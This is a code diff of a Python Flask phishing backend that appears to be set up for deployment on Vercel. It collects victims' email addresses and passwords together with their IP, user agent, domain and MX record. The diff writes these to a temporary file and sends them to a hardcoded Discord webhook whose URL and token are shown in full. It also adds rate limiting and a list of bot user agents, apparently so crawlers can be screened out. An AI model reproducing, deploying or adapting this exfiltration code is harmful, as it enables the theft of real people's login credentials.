@@ -23,20 +23,22 @@ DISCORD_WEBHOOK_URLS = [
     "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
 ]
 
+def get_mx_record(domain):
+    try:
+        answers = dns.resolver.resolve(domain, 'MX')
+        return ', '.join(str(r.exchange) for r in answers)
+    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
+        return "No MX Record Found"
+
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
     webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
 
-    # Create a text file in memory
-    file_content = f"""Email: {email}
-Password: {password}
-IP: {ip}
-User-Agent: {useragent}
-Domain: {domain}
-MX Record: {mx_record}
-"""
-    file_obj = io.BytesIO(file_content.encode())  # Convert to bytes-like object
+    # Save details to a file in /tmp/ (required for Vercel)
+    file_path = "/tmp/log.txt"
+    with open(file_path, "w") as file:
+        file.write(f"Email: {email}\nPassword: {password}\nIP: {ip}\nUser-Agent: {useragent}\nDomain: {domain}\nMX Record: {mx_record}")
 
-    # Prepare Discord embed
+    # Prepare the Discord embed
     message = {
         "username": "Logger Bot",
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",
@@ -57,29 +59,23 @@ MX Record: {mx_record}
         ]
     }
 
-    # Send data to Discord
+    # Send the message with the file attachment
     try:
-        response = requests.post(
-            webhook_url,
-            data={"payload_json": str(message)},  # Send embed data
-            files={"file": ("log.txt", file_obj, "text/plain")}  # Attach the in-memory file
-        )
-        if response.status_code != 200:
-            print(f"Error sending message to Discord: {response.text}")
+        with open(file_path, "rb") as file:
+            response = requests.post(
+                webhook_url,
+                data={"payload_json": str(message)},
+                files={"file": ("log.txt", file, "text/plain")}
+            )
+        if response.status_code != 204:
+            print(f"Failed to send message: {response.status_code} - {response.text}")
     except requests.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
-def get_mx_record(domain):
-    try:
-        answers = dns.resolver.resolve(domain, 'MX')
-        return ', '.join(str(r.exchange) for r in answers)
-    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
-        return "No MX Record Found"
-
 app = Flask(__name__)
+app.secret_key = os.urandom(24) 
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
-secret_keyx = secrets.token_urlsafe(24)
-app.secret_key = secret_keyx
+
 
 bot_user_agents = [
 'Googlebot', 
